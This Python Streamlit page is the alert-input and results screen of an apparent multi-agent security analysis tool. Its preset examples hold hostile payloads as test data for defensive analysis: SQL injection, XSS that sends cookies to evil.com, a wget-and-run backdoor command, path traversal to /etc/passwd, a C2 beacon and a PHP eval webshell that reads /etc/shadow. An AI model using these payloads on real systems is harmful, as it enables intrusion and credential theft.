#!/usr/bin/env python3
"""
告警分析页面（Alert Analysis Page）

本页面是多智能体安全分析系统的核心交互界面，提供：
1. 告警信息输入表单（攻击类型、载荷、IP 地址等）
2. 预设攻击示例快速加载（7 种典型攻击场景）
3. 分析结果可视化展示（关键指标、专家分析、路由决策、性能数据）

页面布局：
  左列：告警输入表单
  右列：预设示例选择器
  底部：分析结果展示区（提交后出现）

数据流：
  用户填写表单 → 点击"开始分析" → APIClient 发送 POST 请求 → 后端分析 → 结果展示
"""
import streamlit as st
import json
from datetime import datetime
import sys
import os

# 将项目根目录添加到 Python 路径，以便导入 frontend.utils 模块
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from frontend.utils.api_client import APIClient

# 页面配置：设置标题和布局
st.set_page_config(page_title="告警分析", page_icon="🔍", layout="wide")

st.title("🔍 安全告警分析")
st.markdown("---")

# 初始化前端 API 客户端，用于与后端 FastAPI 服务通信
api_client = APIClient("http://localhost:8000")

# 后端连接检查：如果后端不可用，显示错误提示并阻止后续操作
if not api_client.health_check():
    st.error("⚠️ 无法连接到后端服务,请确保FastAPI服务正在运行")
    st.info("启动命令: `python start_backend.py`")
    st.stop()   # 终止页面渲染，防止在无后端的情况下继续操作

# ==================== 预设攻击示例 ====================
# 每种攻击类型包含一个完整的告警数据模板
# 用户可以快速加载这些示例到表单中进行测试
EXAMPLES = {
    "SQL注入": {
        "attack_type": "SQL注入",
        "payload": "SELECT * FROM users WHERE id='1' UNION SELECT username, password FROM admin--",
        "source_ip": "192.168.1.100",
        "dest_ip": "10.0.0.5"
    },
    "XSS攻击": {
        "attack_type": "XSS攻击",
        "payload": "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
        "source_ip": "192.168.1.101",
        "dest_ip": "10.0.0.6"
    },
    "命令注入": {
        "attack_type": "命令注入",
        "payload": "; wget http://malicious.com/backdoor.sh && chmod +x backdoor.sh && bash backdoor.sh",
        "source_ip": "192.168.1.102",
        "dest_ip": "10.0.0.7"
    },
    "目录遍历": {
        "attack_type": "目录遍历",
        "payload": "GET /download?file=../../../../etc/passwd HTTP/1.1",
        "source_ip": "192.168.1.103",
        "dest_ip": "10.0.0.8"
    },
    "C2通信": {
        "attack_type": "C2通信",
        "payload": "POST /api/beacon HTTP/1.1\nHost: c2-server.evil.com\nUser-Agent: Mozilla/5.0\n\n{\"id\":\"bot-38a2\",\"cmd\":\"whoami\",\"result\":\"root\"}",
        "source_ip": "10.0.0.15",
        "dest_ip": "203.0.113.66"
    },
    "Webshell": {
        "attack_type": "Webshell",
        "payload": "<?php @eval($_POST['cmd']); ?>\n\nPOST /uploads/images/shell.php HTTP/1.1\ncmd=system('cat /etc/shadow');",
        "source_ip": "192.168.1.104",
        "dest_ip": "10.0.0.9"
    },
    "其他": {
        "attack_type": "其他",
        "payload": "暴力破解尝试: 用户admin在5分钟内连续登录失败23次, 来源IP频繁切换, 疑似使用代理池进行撞库攻击",
        "source_ip": "45.33.32.156",
        "dest_ip": "10.0.0.2"
    }
}

# 攻击类型列表，用于下拉选择框
ATTACK_TYPES = list(EXAMPLES.keys())

# ==================== 页面布局：两列 ====================
col1, col2 = st.columns([1, 1])

# ---------- 左列：告警输入表单 ----------
with col1:
    st.header("输入告警信息")

    # 检查是否有从右列加载的预设示例数据
    # session_state 是 Streamlit 的跨渲染周期状态管理机制
    loaded = st.session_state.get('example_data', None)

    # 使用 st.form 创建表单，防止每次输入变化都触发页面重渲染
    with st.form("alert_form"):
        # 攻击类型下拉选择框
        attack_type = st.selectbox(
            "攻击类型*",
            ATTACK_TYPES,
            # 如果有加载的示例，自动选中对应的攻击类型
            index=ATTACK_TYPES.index(loaded["attack_type"]) if loaded and loaded["attack_type"] in ATTACK_TYPES else 0
        )

        # 攻击载荷文本输入区（多行文本框）
        payload = st.text_area(
            "攻击载荷*",
            value=loaded["payload"] if loaded else "",
            height=150,
            placeholder="请输入攻击载荷内容..."
        )

        # IP 地址输入：源 IP 和目标 IP 并排放置
        col_a, col_b = st.columns(2)
        with col_a:
            source_ip = st.text_input("源IP地址", value=loaded["source_ip"] if loaded else "192.168.1.100")
        with col_b:
            dest_ip = st.text_input("目标IP地址", value=loaded["dest_ip"] if loaded else "10.0.0.5")

        # 提交按钮：点击后触发分析流程
        submit = st.form_submit_button("🚀 开始分析", use_container_width=True, type="primary")

    # 清除已加载的示例数据，防止下次渲染时表单被重复填充
    if loaded:
        del st.session_state['example_data']

# ---------- 右列：预设示例选择器 ----------
with col2:
    st.header("预设示例")

    # 示例类型选择下拉框
    selected_example = st.selectbox("选择攻击类型示例", ATTACK_TYPES)

    # "加载到表单"按钮：将选中的示例数据存入 session_state，然后触发页面重渲染
    if st.button("📋 加载到表单", use_container_width=True):
        st.session_state['example_data'] = EXAMPLES[selected_example]
        st.rerun()   # 触发页面重新渲染，左列表单会读取 session_state 中的示例数据

    # 预览当前选中的示例数据（JSON 格式展示）
    example = EXAMPLES[selected_example]
    st.code(json.dumps(example, ensure_ascii=False, indent=2), language="json")

# ==================== 分析结果展示区 ====================
# 当用户点击"开始分析"按钮后，执行以下逻辑
if submit:
    # 输入验证：载荷不能为空
    if not payload:
        st.error("❌ 请输入攻击载荷")
        st.stop()

    # 构建告警数据字典
    alert_data = {
        "attack_type": attack_type,
        "payload": payload,
        "source_ip": source_ip,
        "dest_ip": dest_ip,
    }

    # 显示加载动画，同时发送分析请求到后端
    with st.spinner("🔄 正在分析告警,请稍候..."):
        try:
            # 调用后端 POST /api/analyze 接口
            result = api_client.analyze_alert(alert_data)

            st.success("✅ 分析完成!")

            st.markdown("---")
            st.header("📊 分析结果")

            # ---------- 关键指标概览（4列布局） ----------
            metric_cols = st.columns(4)
            with metric_cols[0]:
                st.metric("任务ID", result['task_id'][:8] + "...")      # 只显示前8位 UUID
            with metric_cols[1]:
                threat_level = result['expert_analysis']['threat_level']
                st.metric("威胁等级", threat_level)
            with metric_cols[2]:
                risk_score = result['expert_analysis']['risk_score']
                st.metric("风险评分", f"{risk_score}/10")
            with metric_cols[3]:
                total_time = result['performance']['total_time_ms']
                st.metric("处理耗时", f"{total_time}ms")

            # ---------- 详细分析结果（3个标签页） ----------
            tab1, tab2, tab3 = st.tabs(["🎯 专家分析", "🔀 路由决策", "⚡ 性能指标"])

            with tab1:
                # 专家分析详情：攻击技术、详细分析、防御建议
                st.subheader("攻击技术识别")
                st.info(f"**{result['expert_analysis']['attack_technique']}**")

                st.subheader("详细分析")
                st.write(result['expert_analysis']['analysis'])

                st.subheader("防御建议")
                for idx, rec in enumerate(result['expert_analysis']['recommendations'], 1):
                    st.markdown(f"{idx}. {rec}")

            with tab2:
                # 路由决策详情：选择了哪个专家、置信度
                st.subheader("路由决策")
                st.write(f"**选择路由**: {result['routing']['selected_route']}")
                st.write(f"**置信度**: {result['routing']['confidence']:.2%}")

            with tab3:
                # 性能指标：各阶段的处理耗时
                st.subheader("性能指标")
                perf_data = result['performance']
                st.json(perf_data)

            # 可展开区域：查看完整的 JSON 响应
            with st.expander("查看完整JSON结果"):
                st.json(result)

        except Exception as e:
            st.error(f"❌ 分析失败: {str(e)}")
            st.exception(e)    # 显示完整的异常堆栈（方便调试）
